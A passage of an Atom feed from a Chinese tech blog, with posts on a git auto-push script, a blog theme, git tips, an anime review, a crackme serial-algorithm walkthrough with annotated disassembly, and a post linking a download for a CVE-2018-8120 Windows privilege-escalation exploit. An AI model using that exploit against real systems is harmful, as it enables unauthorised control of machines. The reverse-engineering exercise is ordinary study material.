class="line">    git_remotes = subprocess.check_output([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'-v'</span>])</span><br><span class="line">    git_remotes_str = bytes.decode(git_remotes).strip()</span><br><span class="line">    git_remotes_list = [line.split()[<span class="number">0</span>] <span class="keyword">for</span> line <span class="keyword">in</span> git_remotes_str.split(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> git_remotes_list:</span><br><span class="line">            subprocess.check_call([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'add'</span>, k, v[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add . &amp; commit with message</span></span><br><span class="line">    subprocess.check_call([<span class="string">'git'</span>, <span class="string">'add'</span>, <span class="string">'.'</span>])</span><br><span class="line">    commit_message = <span class="string">'Site updated: %s'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        commit_message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    subprocess.call([<span class="string">'git'</span>, <span class="string">'commit'</span>, <span class="string">'-m'</span>, commit_message])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push to every remote repo</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'push'</span>, k, <span class="string">'master:%s'</span> % v[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span>:</span><br><span class="line">            print(<span class="string">'Usage:\n\t%s [commit_message]'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>纸小墨ink简洁主题story爱上你的故事</title>
    <link href="http://hacktech.cn/2018/08/22/ink-theme-story.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-theme-story.html</id>
    <published>2018-08-22T07:36:42.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h2><p>为纸小墨写的一款主题,该主题移植自<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a><br><!--和[Artifact.](https://artifact.me/)--></p><p>github地址：<a href="https://github.com/akkuman/ink-theme-story" target="_blank" rel="noopener">ink-theme-story</a></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ink-theme-story.pancakeapps.com" target="_blank" rel="noopener">ink-theme-story</a></p><a id="more"></a><h3 id="主题的一些食用说明"><a href="#主题的一些食用说明" class="headerlink" title="主题的一些食用说明"></a>主题的一些食用说明</h3><h4 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h4><p>标题旁边有一个 · 字符，点击后便可显示菜单。<strong>1</strong>,<strong>2</strong>,<strong>3</strong> 分别代表 <strong>独立页面菜单</strong>、<strong>导航树</strong>(仅在文章界面有用)以及<strong>搜索框</strong>。</p><h3 id="一些功能"><a href="#一些功能" class="headerlink" title="一些功能"></a>一些功能</h3><ul><li>评论点击加载, 可以应对一些墙导致无法加载的场景</li><li>图片懒加载</li><li>评论系统支持来必力, Disqus, Gitment, 默认为Disqus</li><li>…</li></ul><h2 id="主题截图"><a href="#主题截图" class="headerlink" title="主题截图"></a>主题截图</h2><p><img src="https://i.loli.net/2018/08/20/5b7a62b4ce584.png" alt="Screenshot_20180820_143859.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><p>进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录</p><p>然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akkuman/ink-theme-story.git</span><br></pre></td></tr></table></figure></p><p>或者下载git压缩包后解压到blog文件夹</p><p>现在你可以看到blog目录下的ink-theme-story目录</p><p>然后修改站点配置文件<code>blog/config.yml</code></p><p>站点配置文件一般如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">site:</span></span><br><span class="line"><span class="attr">    title:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">    subtitle:</span> <span class="string">"Akkuman的技术博客"</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">    theme:</span> <span class="string">ink-theme-story</span></span><br><span class="line"><span class="attr">    lang:</span> <span class="string">zh</span></span><br><span class="line"><span class="attr">    url:</span> <span class="string">"ink-theme-story.pancakeapps.com"</span></span><br><span class="line"><span class="attr">    comment:</span> <span class="string">Akkuman</span></span><br><span class="line"><span class="attr">    logo:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line">    <span class="comment"># link: "&#123;category&#125;/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line"><span class="attr">    link:</span> <span class="string">"&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;title&#125;.html"</span></span><br><span class="line">    <span class="comment"># root: "/blog"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">authors:</span></span><br><span class="line"><span class="attr">    me:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="attr">        intro:</span> <span class="string">"编程小白|技术菜鸟"</span></span><br><span class="line"><span class="attr">        avatar:</span> <span class="string">"-/images/avatar.png"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">build:</span></span><br><span class="line">    <span class="comment"># output: "public"</span></span><br><span class="line"><span class="attr">    port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="comment"># Copied files to public folder when build</span></span><br><span class="line"><span class="attr">    copy:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">"source/images"</span></span><br><span class="line">    <span class="comment"># Excuted command when use 'ink publish'</span></span><br><span class="line"><span class="attr">    publish:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        git add . -A</span></span><br><span class="line"><span class="string">        git commit -m "update"</span></span><br><span class="line"><span class="string">        git push origin</span></span><br></pre></td></tr></table></figure><p>我们需要<strong>修改</strong>的地方有:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">title</span>   <span class="comment">#title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样</span></span><br><span class="line"><span class="string">subtitle</span>    <span class="comment">#网站子标题, 在标签页和归档能看到</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">8</span>    <span class="comment">#每页可显示的文章数目, 为了美观建议设置为8</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">ink-theme-story</span>    <span class="comment">#网站主题目录, 设置为该主题ink-theme-story</span></span><br></pre></td></tr></table></figure></p><p>其他地方根据自己需求更改, 纸小墨说明文档见<a href="http://www.chole.io/blog/ink-blog-tool.html" target="_blank" rel="noopener">简洁的静态博客构建工具 —— 纸小墨（InkPaper）</a></p><h3 id="关于页面"><a href="#关于页面" class="headerlink" title="关于页面"></a>关于页面</h3><p>在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明</p><p>纸小墨中每一篇文章的头配置大致如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">"简洁的静态博客构建工具 —— 纸小墨（InkPaper）"</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2015</span><span class="bullet">-03</span><span class="bullet">-01</span> <span class="number">18</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">update:</span> <span class="number">2016</span><span class="bullet">-07</span><span class="bullet">-11</span> <span class="number">17</span><span class="string">:00:00</span> <span class="string">+0800</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">me</span></span><br><span class="line"><span class="attr">cover:</span> <span class="string">"-/images/example.png"</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">设计</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">写作</span></span><br><span class="line"><span class="attr">preview:</span> <span class="string">纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。</span></span><br></pre></td></tr></table></figure><p>其中的<code>preview</code>是文章预览，也可在正文中使用<code>&lt;!--more--&gt;</code>分割, 是一个可选字段,我们不必管</p><p>对我们有影响的字段配置除了基础的<code>title</code>等等之外, 需要关注一下<code>author</code>这个字段</p><p>纸小墨每一篇文章的作者的关于页面是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">about.&#123;&#123;.Author.Id&#125;&#125;.html</span><br></pre></td></tr></table></figure><p>比如我上面的站点配置文件中<code>authors</code>有一个值是<code>me</code>, 那么这个作者的关于页面就是<code>about.me.html</code>, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件<code>about.me.md</code>, 可以参见这个文件的格式, 我在这里给出来: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于作者&quot;</span><br><span class="line">author: me</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 纸小墨</span><br><span class="line"></span><br><span class="line">构建只为纯粹书写的博客。</span><br><span class="line"></span><br><span class="line">[http://www.chole.io/](http://www.chole.io/)</span><br></pre></td></tr></table></figure><p>那么这个文件生成后就会在站点根目录下生成<code>about.me.html</code>文件.</p><p><strong>重点来了</strong></p><p>上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;.Site.Root&#125;&#125;/about.html"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i18n "about"&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们只需要按照上面<code>about.me.md</code>的格式新建一个<code>about.md</code>即可, 我在这里给出一个<code>about.md</code>例子: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">type: page</span><br><span class="line">title: &quot;关于本站&quot;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">我是一个站点关于页面例子</span><br></pre></td></tr></table></figure><p><code>author</code>字段可省略,看自己的喜好</p><h3 id="评论系统切换"><a href="#评论系统切换" class="headerlink" title="评论系统切换"></a>评论系统切换</h3><p>本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击<code>show comments</code>时才会开始加载评论</p><p>本主题的评论系统支持来必力, Disqus, Gitment</p><h4 id="来必力Livere"><a href="#来必力Livere" class="headerlink" title="来必力Livere"></a>来必力Livere</h4><p>切换为来必力的话只需要修改站点配置文件<code>blog/config.yml</code>, 把<code>comment</code>字段的值修改成来必力的<code>data-uid</code>(<em>可在来必力后台代码管理中看到</em>), 然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可</p><h4 id="Gitment"><a href="#Gitment" class="headerlink" title="Gitment"></a>Gitment</h4><p>切换为Gitment的话同上修改, <code>comment</code>字段的格式为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">comment:</span> <span class="string">"owner:repo:client_id:client_secret"</span></span><br></pre></td></tr></table></figure><p>其中各个的属性为</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">owner</span>           <span class="comment">#你的 GitHub ID</span></span><br><span class="line"><span class="string">repo</span>            <span class="comment">#存储评论的 repo</span></span><br><span class="line"><span class="string">client_id</span>       <span class="comment">#你的 client ID</span></span><br><span class="line"><span class="string">client_secret</span>   <span class="comment">#你的 client secret</span></span><br></pre></td></tr></table></figure><p>然后打开<code>blog/ink-theme-story/_comment.html</code>文件, 把Gitment评论的注释去掉, 然后把Disqus评论加上注释即可</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>特别感谢<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a>提供了这么简洁大方的主题</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;为纸小墨写的一款主题,该主题移植自&lt;a href=&quot;https://yumoe.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Yumoe&lt;/a&gt;&lt;br&gt;&lt;!--和[Artifact.](https://artifact.me/)--&gt;&lt;/p&gt;
&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/akkuman/ink-theme-story&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ink-theme-story.pancakeapps.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
    
    
      <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
    
  </entry>
  
  <entry>
    <title>git忽略对已入库文件的修改</title>
    <link href="http://hacktech.cn/2018/08/22/git-update-index.html"/>
    <id>http://hacktech.cn/2018/08/22/git-update-index.html</id>
    <published>2018-08-22T07:18:42.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。</p><a id="more"></a><ul><li><p>告诉git<strong>忽略</strong>对已经纳入版本管理的文件 <code>.classpath</code> 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p>告诉 git <strong>恢复跟踪</strong> <code>$ git update-index --assume-unchanged .classpath</code></p></li><li><p><strong>查看</strong>当前被忽略的、已经纳入版本库管理的文件：<code>$ git ls-files -v | grep -e &quot;^[hsmrck]&quot;</code></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8120 Windows权限提升</title>
    <link href="http://hacktech.cn/2018/05/18/CVE-2018-8120.html"/>
    <id>http://hacktech.cn/2018/05/18/CVE-2018-8120.html</id>
    <published>2018-05-18T11:55:06.000Z</published>
    <updated>2019-05-23T06:42:08.035Z</updated>
    
    <content type="html"><![CDATA[<p>来源 : <a href="https://github.com/bigric3/cve-2018-8120" target="_blank" rel="noopener">bigric3/cve-2018-8120</a></p><p>Detail : <a href="http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html" target="_blank" rel="noopener">cve-2018-8120-analysis-and-exploit</a></p><a id="more"></a><h2 id="演示图"><a href="#演示图" class="headerlink" title="演示图"></a>演示图</h2><p><img src="https://github.com/bigric3/cve-2018-8120/raw/master/exploit.gif" alt="exploit.gif"></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://github.com/akkuman/cve-2018-8120/releases" target="_blank" rel="noopener">CVE-2018-8120.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来源 : &lt;a href=&quot;https://github.com/bigric3/cve-2018-8120&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;bigric3/cve-2018-8120&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Detail : &lt;a href=&quot;http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cve-2018-8120-analysis-and-exploit&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
      <category term="提权" scheme="http://hacktech.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>补番完了 来自深渊</title>
    <link href="http://hacktech.cn/2018/04/27/made-in-abyss.html"/>
    <id>http://hacktech.cn/2018/04/27/made-in-abyss.html</id>
    <published>2018-04-27T13:31:55.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。</p><a id="more"></a><p>莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。</p><p>其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。</p><p>在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。</p><p>我挺喜欢奥森这个人的，孤傲或者说傲娇。 </p><p>在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。</p><p>都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。</p><p>另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。</p><p>下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。</p><p><img src="https://i.loli.net/2018/04/27/5ae3271829c4f.png" alt="860634.png"></p><p><img src="https://i.loli.net/2018/04/27/5ae32734151eb.png" alt="880846.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。&lt;/p&gt;
    
    </summary>
    
      <category term="anime" scheme="http://hacktech.cn/categories/anime/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="anime" scheme="http://hacktech.cn/tags/anime/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe第十九Brad Soblesky.2</title>
    <link href="http://hacktech.cn/2018/03/02/160CrackMe-019.html"/>
    <id>http://hacktech.cn/2018/03/02/160CrackMe-019.html</id>
    <published>2018-03-02T13:42:41.000Z</published>
    <updated>2019-05-23T06:42:08.035Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrcq7eydj207004jgli.jpg" alt=""><br><a id="more"></a></p><p>查壳无壳，vc写的。  </p><p>我们输入假码后，然后点击，弹出错误框，直接打开od，对<code>MessageBoxA</code>下断点也行，寻找字符串也行。</p><p>一般的错误提示部分代码类似于这样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call xxx</span><br><span class="line">test xxx,xxx</span><br><span class="line">je xxxerror</span><br><span class="line">...</span><br><span class="line">jmp xxx</span><br><span class="line">push xxx ;xxxerror</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">call error</span><br></pre></td></tr></table></figure></p><p>只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。</p><p>我们找到关键跳的<code>call</code>上方下断，可以看到他把一个东西压栈了，可以猜想是真码。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg" alt=""></p><p>然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg" alt=""></p><p>我们可以看到在关键<code>call</code>的前方不远处就有出现，那么这个<code>add</code>前方的<code>call</code>是加密算法<code>call</code>吗？</p><p>显然不是的，我们可以看到这个<code>CString::Format</code>明显是对一个东西进行字符串格式化，格式是<code>%lu</code>(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用<code>%lu</code>格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。</p><p>我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。<code>mov eax,[local.4]</code>这个是这个循环最终跳出来的地方，那么<code>local.4</code>那里就是我们所需要找的东西。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg" alt=""></p><p>在我们之前的两边跟中，我们可以测试发现<code>local.7</code>是你输入的Name的长度，<code>local.5</code>是我们输入的名字。</p><p>我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">004015BE  |&gt; \C745 E0 00000&gt;mov [local.8],0x0</span><br><span class="line">004015C5  |.  EB 09         jmp short Brad_Sob.004015D0</span><br><span class="line">004015C7  |&gt;  8B55 E0       /mov edx,[local.8]</span><br><span class="line">004015CA  |.  83C2 01       |add edx,0x1</span><br><span class="line">004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1</span><br><span class="line">004015D0  |&gt;  8B45 E0        mov eax,[local.8]</span><br><span class="line">004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)</span><br><span class="line">004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8&gt;=len(name)跳出循环</span><br><span class="line">004015D8  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015DB  |.  51            |push ecx</span><br><span class="line">004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name</span><br><span class="line">004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al</span><br><span class="line">004015E4  |.  0FBED0        |movsx edx,al</span><br><span class="line">004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345</span><br><span class="line">004015EA  |.  03C2          |add eax,edx</span><br><span class="line">004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制</span><br><span class="line">004015EF  |.  8B4D E0       |mov ecx,[local.8]</span><br><span class="line">004015F2  |.  C1E1 08       |shl ecx,0x8</span><br><span class="line">004015F5  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">004015F8  |.  33D1          |xor edx,ecx</span><br><span class="line">004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8&lt;&lt;8)^local4</span><br><span class="line">004015FD  |.  8B45 E0       |mov eax,[local.8]</span><br><span class="line">00401600  |.  83C0 01       |add eax,0x1</span><br><span class="line">00401603  |.  8B4D E4       |mov ecx,[local.7]</span><br><span class="line">00401606  |.  0FAF4D E0     |imul ecx,[local.8]</span><br><span class="line">0040160A  |.  F7D1          |not ecx</span><br><span class="line">0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)</span><br><span class="line">0040160F  |.  8B55 F0       |mov edx,[local.4]</span><br><span class="line">00401612  |.  0FAFD0        |imul edx,eax</span><br><span class="line">00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax</span><br><span class="line">00401618  |.^ EB AD         \jmp short Brad_Sob.004015C7</span><br><span class="line">0040161A  |&gt;  8B45 F0       mov eax,[local.4]</span><br></pre></td></tr></table></figure><p>相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// name为输入的第一个值 </span></span><br><span class="line"><span class="keyword">char</span>* name = <span class="string">"111111"</span>;</span><br><span class="line"><span class="keyword">int</span> len_name = <span class="built_in">strlen</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_name&lt;<span class="number">5</span>)</span><br><span 